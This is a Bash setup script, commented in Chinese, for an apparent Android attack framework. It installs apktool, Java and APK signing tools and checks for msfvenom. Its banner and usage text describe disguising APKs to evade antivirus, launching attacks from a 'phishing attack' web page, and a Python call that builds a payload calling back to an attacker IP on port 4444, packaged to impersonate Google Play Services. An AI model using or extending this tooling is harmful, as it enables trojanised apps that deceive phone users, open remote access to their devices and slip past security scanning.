#!/bin/bash
# install_apktool_deps.sh
# 安装apktool和相关依赖，用于APK深度伪装和免杀

echo "=========================================="
echo "  APK深度伪装工具安装脚本"
echo "  Android自动化渗透测试框架"
echo "=========================================="
echo ""

# 检查是否以root权限运行
if [ "$EUID" -ne 0 ]; then 
    echo "警告: 建议使用sudo运行此脚本以获得最佳效果"
    echo "继续安装..."
    echo ""
fi

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# 打印带颜色的信息
print_info() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# 检查命令是否存在
command_exists() {
    command -v "$1" >/dev/null 2>&1
}

# 更新系统
print_info "更新系统包列表..."
sudo apt update

# 安装apktool
print_info "安装apktool..."
if command_exists apktool; then
    print_success "apktool已安装: $(apktool --version | head -1)"
else
    sudo apt install -y apktool
    if command_exists apktool; then
        print_success "apktool安装成功"
    else
        print_error "apktool安装失败"
        exit 1
    fi
fi

# 安装Java JDK（用于签名）
print_info "安装Java JDK..."
if command_exists java; then
    print_success "Java已安装: $(java -version 2>&1 | head -1)"
else
    sudo apt install -y default-jdk
    if command_exists java; then
        print_success "Java安装成功"
    else
        print_error "Java安装失败"
        exit 1
    fi
fi

# 安装zipalign
print_info "安装zipalign..."
if command_exists zipalign; then
    print_success "zipalign已安装"
else
    # zipalign通常在android-sdk-build-tools中
    sudo apt install -y android-sdk-build-tools
    if command_exists zipalign; then
        print_success "zipalign安装成功"
    else
        print_warning "zipalign安装失败（非关键组件）"
    fi
fi

# 安装apksigner
print_info "安装apksigner..."
if command_exists apksigner; then
    print_success "apksigner已安装"
else
    sudo apt install -y apksigner
    if command_exists apksigner; then
        print_success "apksigner安装成功"
    else
        print_warning "apksigner安装失败，将使用jarsigner作为备选"
    fi
fi

# 安装其他有用工具
print_info "安装其他辅助工具..."

# 安装xmlstarlet（用于XML处理）
if ! command_exists xmlstarlet; then
    sudo apt install -y xmlstarlet
fi

# 安装imagemagick（用于图标处理）
if ! command_exists convert; then
    sudo apt install -y imagemagick
fi

# 安装dex2jar（用于DEX文件处理）
if ! command_exists d2j-dex2jar; then
    sudo apt install -y dex2jar
fi

# 安装jd-gui（用于Java反编译，可选）
if ! command_exists jd-gui; then
    print_info "jd-gui未安装，这是可选组件，用于查看Java源代码"
    print_info "如需安装，请运行: sudo apt install jd-gui"
fi

# 创建工具目录
print_info "创建工作目录..."
WORKSPACE_DIR="$HOME/apktool-workspace"
mkdir -p "$WORKSPACE_DIR/templates"
mkdir -p "$WORKSPACE_DIR/output"
mkdir -p "$WORKSPACE_DIR/icons"

# 验证目录创建成功
if [ -d "$WORKSPACE_DIR/templates" ] && [ -d "$WORKSPACE_DIR/output" ] && [ -d "$WORKSPACE_DIR/icons" ]; then
    print_success "工作目录创建完成:"
    print_info "  模板目录: $WORKSPACE_DIR/templates"
    print_info "  输出目录: $WORKSPACE_DIR/output"
    print_info "  图标目录: $WORKSPACE_DIR/icons"
else
    print_error "工作目录创建失败，请检查权限"
    exit 1
fi

# 下载示例模板APK（可选）
print_info "下载示例模板APK..."
if [ ! -f "$WORKSPACE_DIR/templates/calculator.apk" ]; then
    print_info "您可以从以下位置下载示例APK:"
    print_info "  1. F-Droid: https://f-droid.org"
    print_info "  2. APKPure: https://apkpure.com"
    print_info "  3. 使用ADB从设备提取"
fi

# 验证安装
echo ""
echo "=========================================="
print_info "验证安装..."
echo "=========================================="

echo ""
echo "工具版本信息:"
echo "------------------------------------------"

if command_exists apktool; then
    echo -e "${GREEN}✓${NC} apktool: $(apktool --version | head -1)"
else
    echo -e "${RED}✗${NC} apktool: 未安装"
fi

if command_exists java; then
    echo -e "${GREEN}✓${NC} Java: $(java -version 2>&1 | head -1)"
else
    echo -e "${RED}✗${NC} Java: 未安装"
fi

if command_exists keytool; then
    echo -e "${GREEN}✓${NC} keytool: 已安装"
else
    echo -e "${RED}✗${NC} keytool: 未安装"
fi

if command_exists zipalign; then
    echo -e "${GREEN}✓${NC} zipalign: 已安装"
else
    echo -e "${YELLOW}⚠${NC} zipalign: 未安装（可选）"
fi

if command_exists apksigner; then
    echo -e "${GREEN}✓${NC} apksigner: 已安装"
else
    echo -e "${YELLOW}⚠${NC} apksigner: 未安装（可选）"
fi

if command_exists msfvenom; then
    echo -e "${GREEN}✓${NC} msfvenom: $(msfvenom --version 2>&1 | head -1)"
else
    echo -e "${RED}✗${NC} msfvenom: 未安装（请安装Metasploit）"
fi

echo ""
echo "=========================================="
print_success "安装完成！"
echo "=========================================="
echo ""

# 使用说明
cat << EOF
使用说明:
---------

1. 准备模板APK:
   - 将正常的APK文件放入 $WORKSPACE_DIR/templates/
   - 建议使用简单的工具类应用（计算器、手电筒等）

2. 准备图标（可选）:
   - 将PNG格式的图标放入 $WORKSPACE_DIR/icons/
   - 建议尺寸: 192x192 或 512x512

3. 启动Web界面:
   cd /path/to/android-pentest-framework
   python web/app.py

4. 使用apktool深度伪装:
   - 访问 http://localhost:5000
   - 导航到"钓鱼攻击"页面
   - 勾选"启用apktool深度伪装"
   - 配置模板APK路径和伪装选项
   - 启动攻击

5. 命令行使用:
   python3 -c "
   from core.payload_generator import PayloadGenerator
   gen = PayloadGenerator()
   result = gen.generate_android_payload(
       lhost='YOUR_IP',
       lport=4444,
       use_apktool=True,
       template_apk='/path/to/template.apk',
       disguise_config={
           'app_name': 'Google Play Services',
           'package_name': 'com.google.android.gms'
       }
   )
   print(result)
   "

故障排除:
---------
- 如果apktool反编译失败，尝试: apktool empty-framework-dir --force
- 如果签名失败，检查Java是否正确安装
- 如果重新编译失败，检查APK是否有特殊保护

更多信息请参考: APK_Evasion_Guide.md

EOF

echo ""
print_info "安装脚本执行完毕！"
